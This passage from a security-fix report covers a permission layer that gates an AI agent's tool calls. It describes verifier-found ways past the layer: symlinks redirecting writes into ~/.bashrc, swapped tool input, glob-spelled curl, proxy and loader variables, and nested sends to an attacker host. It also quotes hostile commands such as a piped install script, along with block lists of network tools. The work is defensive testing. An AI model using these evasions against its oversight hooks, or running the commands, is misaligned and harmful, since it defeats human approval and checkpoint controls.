earlier batch (git log, round 1 and batches 1 and 2 checked; their tests pass
unchanged). Each fix has tests that fail on the code before it: the 35 new
tests were run with e3968ef's tracker, snapshot store and adapter put back,
and 31 failed; the 4 that passed are controls (an ordinary snapshot store, an
absolute `checkpoint_dir` through a linked parent, an unchanged input, a
control-only call with no record).

#### 10. The checkpoint archive followed a repository-shipped link (medium); siblings: the checkpoint directory, the archive directory, the snapshot store

The tracker opened its state file and lock with `O_NOFOLLOW` and did not load
a state file git tracks, but appended pruned checkpoints with
`open(checkpoint_dir/archive/pruned_checkpoints.jsonl, "a")` after
`archive.mkdir()`. git stores links, so a clone could ship the archive file
as one: the 102nd checkpoint (each a call that needs no checkpoint and no
approval: `git stash create`, a bound `checkpoint` tool) appended a JSON line,
with the `reason` and `scope` a bound tool's caller writes, wherever it led
(the verifier's probe: `~/.bashrc`, and a `$(...)` in the reason ran when the
shell started). Siblings the verifier found: a link at `.checkpoints/archive`
made the tracker create the archive in another directory, and one at
`.checkpoints` itself put the state file, its lock and the archive there
(`O_NOFOLLOW` guards only the last component; `mkstemp` and `os.replace` ran
in the linked directory). Sibling found here: `FileSnapshotStore(".",
".snapshots")`, which the SDK guide names, resolved `store_dir` through a
link and created `objects/` and `manifests/` there, and `chmod`ed the target
to 0700.

- Fix: `grounded_agency/utils/layer_dir.py` (`open_layer_dir`, `LayerDir`,
  `LinkedPathError`): a directory of the layer's records is opened without
  following a link at it, nor, for a relative path, at any directory on the
  way to it from the current one (the directories above an absolute path are
  the host's); every file operation then stays in that directory through its
  descriptor (`dir_fd`: open with `O_NOFOLLOW`, `mkdir`, the temporary file,
  `os.replace`, `unlink`), with an `lstat` check per name where the platform
  has no `dir_fd`.
- Tracker: the state file, its lock, its temporary file and the archive are
  opened through it; the archive only as a regular file (`fstat`, opened
  `O_NONBLOCK` so a FIFO is not waited on), created mode 0600, and an
  archive git tracks is neither read nor appended to (`_tracked_by_git`, as
  for the state file). With a link, the tracker writes nothing and keeps its
  records in memory; a prune that cannot archive is logged with the ids it
  drops, and the pruned checkpoints' content is discarded either way
  (before, it was discarded only after a successful archive write).
- Snapshot store: `_private_store` makes or checks `store_dir`, `objects/`
  and `manifests/` the same way (mode 0700 through the descriptor) and
  raises `ValueError` for a link.
- Not changed: the tracker's `marker_dir` (`.claude/checkpoint.ok`) keeps
  the plugin's convention, which reads and writes a linked `.claude` where
  it leads (round 2 #2); the tracker writes a fixed name with fixed content
  there by `os.replace`, never through a link at the file and never an
  append. The evidence, idempotency and memory stores open a path the host
  names with `O_NOFOLLOW` at the file and create no directory.
- Tests: `tests/test_shipped_record_links.py` (16): a shipped link at the
  archive file, at `.checkpoints/archive` and at `.checkpoints`, from a
  relative and an absolute `checkpoint_dir` (nothing written or read through
  it, the prune logged, the tracker still authorises its calls); a tracked
  archive neither read nor written; the adapter end to end (102 calls of a
  bound checkpoint tool through the hooks `wrap_options` installs, the
  verifier's reproduction); the snapshot store with a linked `store_dir`,
  `objects/` or `manifests/` (`ValueError`, nothing made there, no mode
  change); controls (an ordinary archive, written 0600 and read back; an
  absolute path through a linked parent; an ordinary store).

#### 11. A boundary in any session cleared the per-call state of other sessions' calls in flight (medium)

`end_of_turn` (the Stop or UserPromptSubmit of any session the adapter
serves) cleared `_call_dirs` and `_asked_at` for every call. The permission
callback then classified a waiting call in the host process's directory and
counted `approval.expires` from its own start: a `git log -p` in a partial
clone (gated as `mutate` and `send` in its own directory) was `observe` and
allowed with no approval, on a checkpoint the boundary had ended; a decision
40 s after a PT30S ask was allowed. The window is from A's PreToolUse hook
to the start of the callback (the verifier's correction: a boundary while the
host's prompt is open was already refused).

- Fix: one record per call, `_HookCheck` (the digest of the input the hook
  checked, the call's `cwd`, the time of its ask), kept by the PreToolUse
  hook for every call it passes or asks about (a wrapper around the checks,
  so every such return keeps one) in `_hook_checks`, until the call reports
  back (PostToolUse, PostToolUseFailure drop it first thing) or the callback
  refuses it. No boundary clears it: it records what was checked and
  authorises nothing (the boundary still clears `_allowed`, `_asked_calls`
  and `_outcome_recorded`). The table is bounded (`_HOOK_CHECK_LIMIT`, 4096,
  oldest first: a call the host refused by its own rules leaves one).
- The callback refuses with R407 a call it has no record of (§5.18.8: it
  cannot tell what was checked), a control-only call excepted; a call
  without a `tool_use_id` that needs a checkpoint keeps its earlier
  diagnostic (F501 when no checkpoint is valid, else R407).
- Tests: `TestABoundaryKeepsWhatTheHookChecked` in
  `tests/test_permission_callback_record.py` (the partial clone with the host
  process elsewhere and session B's Stop or UserPromptSubmit in between:
  refused as `mutate`, nothing fetched; with a host that approves, F501; the
  PT30S expiry with the callback starting at 25 s and the answer at 40 s:
  F502), and `TestACallTheHookHasNoRecordOf` (R407; a control-only call still
  runs; the record goes when the call reports back or is refused; the
  oldest goes past the limit, and its call is then R407).

#### 12. The permission callback did not check input other than the one the hook checked (medium)

`decide_permission` classified the callback's input, but ran the secret,
destination and prerequisite checks only when the host's allow carried an
`updated_input` that differed from it. Claude Code gives every PreToolUse
hook the model's input and then runs the call with another hook's
`updatedInput` in its place (read from the bundled CLI by the verifier), so
the callback was asked about input B while the hook had checked A: a send to
a destination the policy refuses and persist data holding an AWS key were
allowed, with or without a host callback.

- Fix: with #11's record, an input whose digest differs from the one the
  hook checked (or with no record, in non-strict mode) is changed arguments
  (§5.18.7), `_changed_input_refusal`: the secret and destination checks of
  §5.18.10 (F504), the prerequisites and a checkpoint the call does not hold
  (F501, F503, V102; logged with `strict_mode=False`), and F502 for a call
  that requires approval (the decision asked for was on other arguments).
  The host's own `updated_input` is checked as before.
- Not covered, named in the statement's host gaps and SECURITY.md §5.5: a
  call the hook passed that Claude Code's own rules allow without the
  callback (`allowed_tools`, an allow rule, `bypassPermissions`) runs with
  another hook's `updatedInput`, which the layer sees only at PostToolUse; a
  host that adds such a hook keeps the tools it rewrites out of those rules.
  For the plugin the same rewrite comes from a hook in the settings, whose
  commands already run unchecked (round 2 #6, #9).
- Tests: `TestAnInputTheHookDidNotCheck` (the verifier's cases: a refused
  destination and a key in `TaskCreate` data, F504 with and without a host
  callback; an allowed destination with other arguments, F502; `ls` checked
  and `rm -rf x` asked about, F501; the same input, allowed and granted).

#### 13. Re-wrapping options kept the first wrap's safety hook (medium); siblings: the permission mode, a prompt tool removed

`wrap_options` kept the existing hooks when they held this adapter's safety
hook, which was built with the first wrap's `prompt_tool` and
`options_mode`. Wrapped, then given a `permission_prompt_tool_name` (and
`can_use_tool=None`, which the SDK requires) and wrapped again, the options
had no callback and the old hook asked about a Write and held its
checkpoint: allowed by the prompt tool after another session's boundary, it
ran on the ended checkpoint with no F501 (round 1 #20's R407 no longer
applied), and `approval.expires` was not refused (F502). Siblings: a
`permission_mode` set between the wraps was not read (the hook answered
`ask` in `bypassPermissions` for an input without a mode), and a prompt tool
removed between the wraps kept refusing Writes with R407.

- Fix: on a re-wrap, `_replace_safety_hook` puts a safety hook built for the
  options now wrapped where the first one was, keeping any other function an
  entry held beside it; the other hooks are kept as before (one safety hook,
  so the rate limit is charged once).
- Tests: four in `TestWrapOptionsApproval` (`tests/test_tool_call_approval.py`):
  re-wrapped with a prompt tool, a Write is R407 holding nothing and an
  `approval.expires` binding F502, with one safety hook; re-wrapped in
  `bypassPermissions`, F502; re-wrapped without the prompt tool, the Write is
  asked about and allowed; a host function sharing the safety hook's entry
  is kept.

#### Tests changed to the new behaviour

31 tests called the permission callback without the PreToolUse hook that
Claude Code always runs first, so they met #11's R407. One,
`test_context_without_tool_use_id_still_needs_a_checkpoint`, passes
unchanged once a call without a `tool_use_id` keeps its F501 diagnostic.
The other 30 now run the hook on the call first
(`tests/conftest.py::pre_tool_use`, or the wrapped options' hook), keeping
what they test: `test_permission_callback.py` (4),
`test_tool_call_approval.py` (13), `test_sdk_e2e.py` (4),
`test_sdk_integration.py` (4), `test_checkpoint_holds.py` (3, through a
local `_decide` that refuses where the hook refuses),
`test_mcp_integration.py` (1), `test_adapter_effects.py` (1). One more
stated #13's old behaviour: `test_wrapping_twice_charges_the_rate_limit_once`
(`test_sdk_e2e.py`) asserted that the re-wrapped hooks equal the first
wrap's; it now asserts that the other hooks are equal and that PreToolUse
holds one entry with one safety hook, and still charges the rate limit
once. Where the old
test asserted the callback's F501 for a call the hook itself refuses, it now
asserts the hook's F501 (the callback is never asked about such a call);
`test_host_is_not_asked_about_a_call_without_a_checkpoint` now ends the held
checkpoint's validity between the hook and the callback, the path on which
the callback meets it; `test_the_request_is_the_layers_ask` asks the second
call through the hook and adds a third, never asked about, which is R407.
The four SDK demos (`examples/grounded_agent_demo.py`,
`checkpoint_enforcement_demo.py`, `mcp_tools_demo.py`,
`capability_skills_demo.py`) run the hook before the callback the same way,
and `tests/test_examples_demos.py` passes unchanged.

#### Siblings checked

- The TypeScript package and the Standard Agents binding check a call in
  the tool's own handler, with the arguments it runs with, and bind a
  decision to their digest: there is no hook and callback pair, no
  per-call state a boundary clears, no wrapping of options, and no file the
  binding writes (no archive, no state file). No call fixture changes.
- The plugin's hooks: Claude Code's own prompt decides, with no callback of
  the layer's; another hook's `updatedInput` is the host gap above. The
  plugin's take hook already refuses a linked records or commits directory.
- The other adapter tables a boundary clears (`_allowed`, `_asked_calls`,
  `_outcome_recorded`) are authorisations, which a boundary must withdraw.

#### Documentation

SECURITY.md §5.5 (the tracker's and the store's link rule; what the callback
decides on, the R407 and changed-input rules and the `updatedInput` host gap;
re-wrapping), the adapter's statement (`host_gaps`, the `updatedInput` gap),
`docs/integrations/claude_agent_sdk.md` (the checkpoint section, the approval
list, checkpoint content), the docstrings of `wrap_options`, the permission
callback and `CheckpointTracker`, and CHANGELOG [Unreleased] Upgrading (the
tracker and the snapshot store; re-wrapping; the callback). The Standard's
text was not changed: §5.18.7's changed-arguments rule already covers
arguments other than those the call was checked with, and §5.18.8 the R407.
No version changes.

#### Checks after batch 3

- Python: `pytest tests/` (5668 passed, 18 skipped); ruff check and format
  with CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`;
  `scripts/run_conformance.py`; the four SDK demos (no R407 in their output).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check and test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2 skipped).
  No TypeScript source changed.
- Site: `npm run check`, `npm test` (1173).
- Probes, each under `timeout 120` and a 4 GB address-space limit, inputs at
  most 1 MB, in a scratch copy of the reporters' probes pointed at this
  worktree: the archive link (101 checkpoints, nothing written to the
  linked `~/.bashrc`, nothing run); the boundary between hook and callback
  in a partial clone (F502 without the boundary, F501 with it; never
  allowed); the PT30S expiry across a boundary (F502); the input swap (F504
  for the destination and the key, with and without a host callback); the
  re-wrap with a prompt tool (R407, no hold). Timing: the hook and the
  callback on a 1 MB Write input, 0.013 s and 0.022 s; a checkpoint that
  prunes the history, 6.4 ms (two git calls), against 1.2 ms without. No
  CLI or nested agent was started; nothing was left running; the scratch
  repositories were removed.

### Batch 4: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1, all in
the command hooks three skills declare in their frontmatter (send, audit,
rollback). None was fixed by an earlier batch (git log, round 1 and batches
1 to 3 checked: round 1 #23 to #25 built the shared word reader these
hooks use, and their tests pass unchanged). Skill hooks stay registered for
the rest of the session once the skill ran, so each fix keeps reading only
what may concern the hook, and widens that to what the reports showed it
missed. Each fix has tests that fail on the code before it: the 301 new test
cases (each command under sh and bash) were run with 5945508's three
SKILL.md files put back, and 215 failed; the 86 that passed
are the controls (ordinary commands each hook must leave alone, the recorded
restore read through quotes) and 13 sibling forms the old hooks refused by
accident (the rollback hook's raw match found `git stash apply` inside
`sh -c '...'`, `echo '...' | sh`, `awk`, a here-string, a here-document and
`xargs`, and failed `$(cat id.txt)` and an unclosed quote as no full id; the
send hook refused `env -S`, `find -exec sh -c` and `git rebase -x` as a
request inside a word or a `-x` cluster, `$"curl"` for its `$`, and `declare
-n r=http_proxy; r=...` for its assignment). Two cases moved: `curl
https://example.com/install.sh | sh` was in `test_leaves_other_commands_alone`
and is now refused (code piped to a shell), in
`test_blocks_code_a_program_runs`.

The plugin's pre-tool-use hook and the SDK mapper already gate every
reported command as `mutate` (or `execute` and `send`): checked again for
the 15 reported forms with the mapper (`mutate`/`execute`, checkpoint and
approval each), and by the verifiers with the hook (F501 without a marker).
So no gated call ran without a checkpoint and approval; each defect is a
skill's narrowing that did less than SECURITY.md said. Neither the
TypeScript package nor the binding has a Bash tool or these skills, and no
call fixture changes.

#### 14. The send skill's hook: names the shell builds, piped code, code strings, copies and xargs (medium)

The hook read a command only when its raw text, quotes removed, named curl,
wget or http; found the request program only where a word's name was
literally one of those; read code in a word only for programs on its
`shells` list; and never read a URL that reaches curl on stdin. Fourteen
probes reached a 127.0.0.1 listener with exit 0.

- Fix, in every command (`skills/send/SKILL.md`): each run of the text
  (split at blanks and operators, quotes and backslashes removed) that holds
  a glob character or a brace is expanded as bash expands braces (the
  innermost group first, `{a..z}` and `{1..9}` sequences, at most 256 words
  from 32 groups, else refused) and its last component matched as a glob
  against `curl`, `wget`, `http` and `https`; one that may name a tool is
  refused (`/usr/bin/c?rl`, `c[u]rl`, `cu{r,r}l`, `wg?t`, `cp
  /usr/bin/c?rl fetch`). A pattern with no letter or digit of its own (`*`)
  names none, and one of more than 5 characters a match must take (a class
  one, a `*` none) names none, so `ls *.py`, `rm -rf build/*`, `mkdir -p
  src/{a,b}` and a here-document's `* item` lines are left alone. The name
  gate also opens for `$'...'` and `$"..."` (`$'\x63url'`) and for a `/dev/`
  path the shell expands (`/dev/${t}cp`, `$D/tcp/`), which the `$` refusal
  then blocks. A command over 16384 bytes that names a tool or holds a glob
  or a brace is refused (it was only one naming a tool).
- Fix, in a command that names a tool: a request inside a word where the
  command runs any program that runs one (the list now holds `trap`,
  `alias`, `awk` and its kin, `sed`, `find`, `make`, `xargs`, `parallel`,
  the wrappers, editors, database shells, ...; and git when given `-x`,
  `--exec`, `--extcmd` or `foreach`), and a `!` before the tool's name
  counts; code a shell or an interpreter reads from a pipe or a redirection
  (`... | sh`, `sh < f`, `sh <<< '...'`, `| python3`, `python3 -`,
  `/dev/stdin`; a pipe into `python3 -m json.tool` or `python3 -c '...'`
  still runs); `xargs` or `parallel` before the tool; a copier (`cp`, `ln`,
  `install`, `cat`, `dd`, `tee`, `rsync`, ...) the command runs, or runs
  after `sudo` and the like, given the tool; and a git setting outside an
  allowlist (`user.*`, `color.*`, `advice.*`, `init.defaultbranch`,
  `core.quotepath`, `i18n.*`, `column.*`, `log.*`), with `-c` or in `git
  config`, where it refused only `http.*`, `url.*`, `core.gitproxy`,
  `core.sshcommand`, `protocol.*` and `remote.*` (so `alias.*`,
  `core.pager`, `core.fsmonitor`, `credential.helper`, `diff.external` ran).
- Left as the documented limit, stated in the hook and SECURITY.md §5.4: a
  request another program makes with no tool's name in its text (a program
  named by a variable, `"$(...)"` inside quotes, a copy made in an earlier
  command under another name, a script, an interpreter's code). The
  internal-address rule is a host-specific narrowing (§5.18.10's last
  paragraph): the plugin applies no destination policy, so §4.4.2's
  "refuse what you cannot tell" binds no destination here, and the plugin's
  hook gates every such call. Refusing every command the hook cannot read
  would refuse every interpreter for the rest of the session.
- Tests (`TestSendCommandHook`): `test_blocks_code_a_program_runs`,
  `test_blocks_a_request_another_program_starts`,
  `test_blocks_a_word_the_shell_may_expand_to_a_tool`,
  `test_reads_a_name_the_shell_spells`, and new cases in
  `test_leaves_other_commands_alone` (globs and braces that name no tool, a
  here-document of bullets, data piped to `python3 -m json.tool`).

#### 15. The send skill's hook: a proxy variable set without `=` (medium)

The setting rule matched `NAME=` only, but bash sets a variable with no `=`
(`for http_proxy in`, `read`, `printf -v`, `getopts`, a nameref) and exports
it with `export NAME` or `set -a`; git reads `GIT_CONFIG_COUNT`,
`GIT_CONFIG_KEY_n` and `GIT_CONFIG_VALUE_n`, which the rule did not list.

- Fix: a word that names a sensitive variable, with or without a value, is
  refused in a command that names a tool: `CURL_HOME`, `WGETRC`, the CA
  bundles, `HOSTALIASES`, `RES_OPTIONS`, `LOCALDOMAIN`, `BASH_ENV`, any
  `*_proxy` in any case, any `GIT_*` and the loader's `LD_*`/`DYLD_*` as a
  word or a word's part (`-vhttp_proxy`, `r=http_proxy`); `HOME`, `PATH`,
  `ENV`, `IFS` and `XDG_CONFIG_HOME` as a word of their own, `NAME=...`,
  `-vNAME` or a nameref's value. A long option's value stays the request
  reader's (`wget --exe=http_proxy=...` is a redirect, as before).
- Tests: `test_blocks_a_setting_made_without_an_assignment` (the three
  reported forms; allexport, `while read`, `ALL_PROXY`, wget, `-vNAME`, a
  nameref, `getopts`, `GIT_CONFIG_*`, `GIT_CONFIG_PARAMETERS`, `export
  LD_PRELOAD=`, `export PATH=`, `read CURL_HOME`).

#### 16. The audit skill's hook: a brace-expanded path, and a program that takes the file's name from its input (medium)

The hook read a command other than the append form only when its text named
the records, it ran under `.claude`, or it held `*`, `?` or `[`; braces were
no trigger, and a program that writes the files a patch or an archive names
never names them in the command. `tee -a .cl{a,}ude/au{d,}it/rec{o,}rds.js{o,}nl`
and `git apply notes.patch` each wrote a token line into the records file.

- Fix (`skills/audit/SKILL.md`): the hook now reads every command that holds
  a brace, a glob, a redirection with `$` or a backtick, or the name of a
  program that writes the files its input names. A word with a brace is
  expanded as bash does (the send hook's expansion) and each word it gives
  is matched against the records path; a glob or a brace that may name the
  file or a directory on its way (`.claude`, `.claude/audit`: `cd
  .cl*/au*t && ... >> rec*.js*nl`, a sibling the old hook let through) and a
  redirection to a name the shell builds (`>> $A$B$C$D$E`) send the command
  to the full reading (no write but the append form, readers only,
  unquoted braces refused). In every command, a program that writes the
  files its input names is refused where a command runs it or after a
  program that runs another (`timeout 5`, `env -u x`): `patch`, `rsync`,
  `bsdtar`, `cpio`, `pax`, `ar`, `7z`, `unar`, `unrar`, `jar`, `busybox`,
  ...; `tar` but to create or list with short options; `unzip` but to list;
  git's `apply`, `am`, `update-index`, `read-tree`, `checkout-index`,
  `mktree`, `fast-import`, a git alias (`-c alias.*`, `--config-env`, `git
  config alias.*`); `find` with `-exec`, `-execdir`, `-ok`, `-okdir` or
  `-fprint*` running a program other than the readers; `xargs` running one.
  A here-document's lines are read as commands too (`sh <<'EOF'` then `git
  apply`), and one whose text a quote carries past a line's end is refused,
  since where its body ends is not read. Each check reads at most 64 words
  past the program (a longer one is refused), so the reading stays linear.
- Not taken: refusing every program but the readers in every command (the
  session's other work), and a PostToolUse scan of the records file (it
  could only report a credential already written). Left as the documented
  limit: a name built only when a command runs, code inside a word (`sh -c`,
  a command substitution inside quotes, an interpreter's code, a script),
  and a link planted under another name; the plugin's hook gates each as a
  `mutate`.
- Tests (`TestAuditCommandHook`): `test_blocks_a_name_the_shell_builds`,
  `test_blocks_a_program_that_writes_files_its_input_names`,
  `test_a_patch_that_writes_the_records_file_is_refused_before_it_runs`
  (the reported route end to end: refused, and `git apply` does write the
  token), and new cases in `test_allows_other_commands` (`mkdir -p
  src/{a,b}`, `echo {1..3}`, `cp f{,.bak}`, `jq '{a,b}'`, `find -exec grep`,
  `xargs wc -l`, `tar czf`, `unzip -l`, a JSON here-document, the commit
  message here-document with `apply` and `patch` in it).
- Timing: the hook's own long-input paths, 16384 bytes each under a 4 GB
  limit: a word per two bytes 0.58 s, brace words 0.80 s, a here-document
  of 2700 lines 1.30 s, `env` then 4000 `tar` words 0.26 s. A pattern of
  16000 braces took 11.8 s while the glob match built a regex from it; a
  pattern with more characters than the name it is compared with now builds
  none (0.23 s), which also bounds the glob path the hook had before.

#### 17. The rollback skill's hook: other spellings of `git stash apply|pop` (low)

The hook found restores with a regex on the raw text, so `git -C . stash
apply`, `git "stash" apply`, `git stash app''ly` and `git -c x.y=z stash
pop` named no restore and exited 0 for an unrecorded commit.

- Fix (`skills/rollback/SKILL.md`): the hook copies the shared word reader
  (`hooks/shell_words.jq`, kept equal by `test_shell_words_copies_are_equal`,
  which now lists rollback) and reads a command that names `stash` (quotes,
  backslashes and `$` removed) or holds `$'...'` or `$"..."`. A simple
  command with a word that names git (or splits into words, or is the
  program and expands), a `stash` word and a `pop`, `apply` or `branch` word
  (or words the shell expands) is a restore, allowed only as `git stash
  apply|pop <id>`, those four words alone with none expanded, and only for a
  recorded commit, as before; a word holding a command line with `stash` and
  a restore (`sh -c '...'`, `echo '...' | sh`, `awk`'s `system`) and a
  command the reader cannot read are refused with F503 as well. The quoted
  form of a recorded restore (`git "stash" apply <id>`) still restores, as
  the plugin's hook counts it a rollback.
- Tests (`TestRollbackCommandHook`): `test_blocks_another_spelling_of_a_restore`
  (the four reported forms and 19 siblings, recorded commit or not),
  `test_a_long_command_naming_stash_is_refused_in_bounded_time`,
  `test_reads_the_recorded_restore_as_the_shell_passes_it`, and new cases in
  `test_allows_commands_that_restore_nothing`.

#### Siblings checked

- The plugin's pre-tool-use hook and the SDK mapper: each reported form is
  gated (above); the mapper's interpreter and network rules already take
  `send` with the worst case, so a destination policy refuses them in the
  SDK (§4.4.2).
- The persist skill's hook reads file tools' paths and content, not Bash
  commands, so none of these forms reaches it.
- Round 1's send and audit fixes (#23 to #25) hold: their tests pass
  unchanged, with the reader's refusal of an unquoted brace, a here-document
  and an unclosed quote in a command that names a tool or the records.

#### Documentation

SECURITY.md §5.4 (the send, audit and rollback rows: what each hook reads,
refuses and leaves to the plugin's hook; the shared reader's 16384-byte
bound now names the rollback hook), the three hooks' header comments,
`hooks/README.md` (the rollback hook's spellings; the shared reader's three
users and what makes each read a command), and CHANGELOG [Unreleased]
Upgrading (the plugin's skill hooks, with the commands each now refuses for
the rest of a session). The Standard's text was not changed: §5.18.10's last
paragraph already makes a skill hook's extra condition a MAY, and §4.4.2
binds a destination only under a policy. No version changes.

#### Checks after batch 4

- Python: `pytest tests/` (5967 passed, 18 skipped), and again the files
  that read the skills and the docs after the last comment edits (1510
  passed; `tests/test_skill_hooks.py` 1098); ruff check and format with
  CI's lists; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; `sync_skill_schemas.py --check` and the generators' `--check`;
  `scripts/run_conformance.py`.
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check and test (2002; the
  WebAssembly build reused); the binding's check and test (217, 2 skipped).
  No TypeScript source changed: neither has a Bash tool or these skills.
- Site: `npm run check`, `npm test` (1173).
- Old code: the 301 new cases run against 5945508's three SKILL.md files in
  a scratch tree of the test file, its fixtures, the hooks and the skills
  (500 KB, removed): 215 failed, 86 passed (above).
- Probes, each under `timeout 120` and a 4 GB address-space limit, commands
  of at most 1 MB: every reported form of the four defects against the new
  hooks (each refused: F504, or F503 for the rollback hook) and against the
  old ones (each exit 0); the patch route end to end (`git apply` writes the
  token; the hook refuses the call first); the SDK mapper on the 15
  reported forms (each gated). Timing at the 16384-byte bound: the send
  hook 0.04 to 1.16 s (a word per two bytes when it names curl, 1.16 s; a
  glob word per three bytes, 0.41 s; 16000 brackets, 0.04 s); the audit
  hook 0.02 to 1.30 s (above); the rollback hook refuses a 1 MB command
  that names `git stash` at once. No listener was needed (each form is
  refused before it runs); no CLI or nested agent was started; nothing was
  left running; the scratch repositories and trees were removed.

### Batch 5: four reported defects

Four defects, each reproduced by an independent verifier on bfb18b1, all in
the Standard Agents binding's nested calls of tools defined with plain
`defineTool` (`examples/standard_agents/src/acs/grounded.ts`,
`nestingState`). None was fixed by an earlier batch: git log, round 1 (#27
built the plain-tool path, #31 the "what the composite held" rule for
grounded tools, #33 the late-invocation refusal) and round 2 batches 1 to 4
checked, and each reported probe reproduced on fb50354 before the fix. The
root they share: round 1 #27 had the composite's nesting state check a
plain tool's nested call, which runs without the wrapper, by the binding
listed, and it made only three of the checks a call of its own gets, for
only one of the two routes the state offers, against a binding it could not
tell was the one that runs. Each fix has tests that fail on the code before
it: `test/nesting.test.ts`, `test/layer.test.ts` and `test/calls.test.ts`
were run with fb50354's `grounded.ts` put back (the new `layer.ts` kept,
which the old code ignores): of the 16 new tests and the one whose
expectation changed (`uses`), 14 failed; the 3 that passed are controls (a
listed grounded tool is queued, then checked as a call of its own; a plain
tool registered as the one listed runs) and `registerTools`' own
validation. The tests whose setup changed (below) pass on both.

The Python adapter never sees a nested call (its statement's
`does_not_cover`: "a tool's own nested calls") and refuses a composite that
reaches a send under a policy (round 1 batch 3), so none of the four has a
Python sibling; no call fixture changed, and both layers still agree on
every fixture.

#### 18. A nested plain persist or audit call stored a secret (medium)

`invokePlain` checked a send's destination, the composite's decisions and
the prerequisites, then ran the tool: no secret check, although §5.18.10's
persist and audit rows require F504 and §5.18.4 says every other check
still applies. A grounded `persist` tool refused the data; a composite
invoking a plain one stored it, and the trace recorded an executed persist.

- Fix: `invokePlain` refuses (F504, recorded `refused` with `covered_by`)
  a nested call whose binding's capabilities include `persist` or `audit`
  when `holdsCredential(args, composite.secrets)` (the composite's own
  secrets and the layer's), first, as `check` does for a grounded tool.
- Tests: `refuses a nested persist|audit call of a plain tool whose data
  holds a secret, as a grounded one is` (a layer secret, and the default
  patterns' password and AWS key; data without one is stored and recorded
  executed).
- Call fixture: none. The fixture schema states binding records, and each
  runner builds every binding as its own tool (the binding's as grounded
  tools, which already refused), so a fixture cannot say "a tool the layer
  did not define"; the nesting tests pin the plain path instead.

#### 19. queueTool through a composite's state bypassed the invokes list and every check (medium; sibling of round 1 #33)

The nesting state replaced `invokeTool` only; `queueTool` was the runtime's
own, bound to the raw state. A composite queued a listed plain `send` to an
attacker host under a destination policy (and a grounded tool with no
`invokes`, which declared no `uses`, queued any tool); the queued call ran
after the composite with nothing to check it, and the trace held no entry.

- Fix: the nesting state's `queueTool` refuses (throws the F504 refusal,
  and records it) a tool the composite does not list, any tool once its call
  has ended (no `covered_by`), a name the layer cannot tell the runtime runs
  as the listed tool (#21), and a listed plain tool: a queued call runs
  after the composite's call has ended, which §5.18.4 makes a call of its
  own, and a plain tool has no wrapper to check it then. A listed grounded
  or control tool is queued as before: it checks itself when it runs.
  `groundedTool` now declares `uses: invokeNames` always, so a tool with no
  `invokes` declares `uses: []` and a runtime that enforces `uses` refuses
  both routes.
- Tests: `refuses to queue a listed plain tool, whose queued call nothing
  would check` (the reported route: nothing queued, nothing sent, refused
  with `covered_by`), `refuses to queue a tool the composite does not list,
  and declares an empty uses for a tool with no invokes`, `refuses to queue
  through the state once the composite has returned`, and the control
  `queues a listed grounded tool, whose queued call is checked as a call of
  its own` (it asks for its own approval, F502).
- Test changed to the new behaviour: `declares uses only for a tool with
  invokes` became `declares its invokes as uses, and none for a tool with
  no invokes` (`[]` where it was `undefined`).
- Siblings checked: the state's other members run no tool of this thread.
  `getChildThread`/`getParentThread` return another thread's state, a scope
  of its own where a grounded tool checks itself and a plain tool's call is
  not covered (the statement's `does_not_cover`); `runAgent` starts an
  agent's execution, whose tools check themselves; `scheduleEffect` runs an
  effect, whose writes the statement does not cover; `runCode` and the
  network are the composite's own code, which §5.18.4 says `invokes` does
  not bound.

#### 20. A nested plain call's output was never checked (medium)

`invokePlain` completed the entry `executed` whenever the result was not an
error: no output contract (R402), no grounding policy (F505), no minimum
confidence (F504), although SECURITY.md said the binding checks "the output
contract [of] each result [it receives] as a capability output". So a plain
`checkpoint` that returned "snapshot service unavailable, skipped" counted
in `acs:executed`, and a later rollback passed its F503 check; a nested
classify at confidence 0.12 passed a profile's 0.9 minimum.

- Fix: on a success result of a binding that is not control-only,
  `invokePlain` decodes `result.result` as the capability's output
  (`decodeCapabilityOutput`, §5.18.9's consumer checks), then applies the
  composite's grounding policies that require the capability (its own
  `grounding` and its applied profiles', unfiltered by the composite's own
  capability; `seen` is null, as a plain tool attests nothing) and the
  composite's applied profiles' minimum confidence, in the order `execute`
  applies them to a grounded tool. A refused output completes the entry
  `failed` with R402, F505 or F504 (and `reason_code`), so the capability is
  not counted as executed, and the refusal is what the composite's code
  receives. An output that passes is recorded with its evidence anchors
  and notified (§6.6), as a grounded tool's is. A plain tool has no options
  of its own, so the composite's govern its nested calls; a nested grounded
  call keeps its own.
- Tests: `refuses a plain checkpoint whose output is not one (R402): it
  takes none, so a rollback stays F503` (the reported route),
  `checks the contract of each capability` (classify without `labels`,
  retrieve that is not JSON, a send with no result), `applies the
  composite's grounding policies (F505) and its profiles' minimum
  confidence (F504)` (0.12 below 0.9, an out-of-range confidence the
  contract refuses first, no anchors under a `kinds: [file]` policy, and an
  output that passes, recorded with its anchors).
- Tests changed to the new behaviour: round 1 #27's relay tests return a
  send's output (`{"sent": true, "evidence_anchors": []}`) where they
  returned `ok`, which is now R402.
- Timing: a nested plain persist and retrieve with 1 MB of data and output
  each run in 63 ms (64 KB 19 ms, 256 KB 23 ms): the secret scan and the
  decoder are linear.

#### 21. A nested plain call was checked against the record listed, not the tool the runtime runs (medium; plain-tool sibling of round 1 #31)

The nesting state checked a plain tool's nested call by the annotation of
the object in `invokes`, then called `state.invokeTool(name)`, which runs
whatever tool the runtime registers under the name. A composite listing a
plain `retrieve` as `lookup` ran a registered plain `send` to an attacker
host under a policy, recorded as a covered retrieve; a registered send
whose `destination` pointer differed sent where the listed pointer did not
look. The verifier's sibling: a name listed for a grounded tool, under
which the runtime runs a plain send, ran with no entry at all. #31's note
("Plain tools listed in invokes need no change: their binding is the listed
object's") assumed the runtime runs the listed object.

- Fix: the layer cannot read the runtime's registry (`ThreadState` has
  none, and names resolve in the runtime's namespace), so the deployment
  states it: `registerTools({ name: tool })` (new, `src/acs/layer.ts`),
  called with the agent's tools once they are defined; calls add up, a name
  registered with two different tools is one the layer cannot tell, and
  `resetLayer` clears it. A nested invocation (`invokeTool` or `queueTool`)
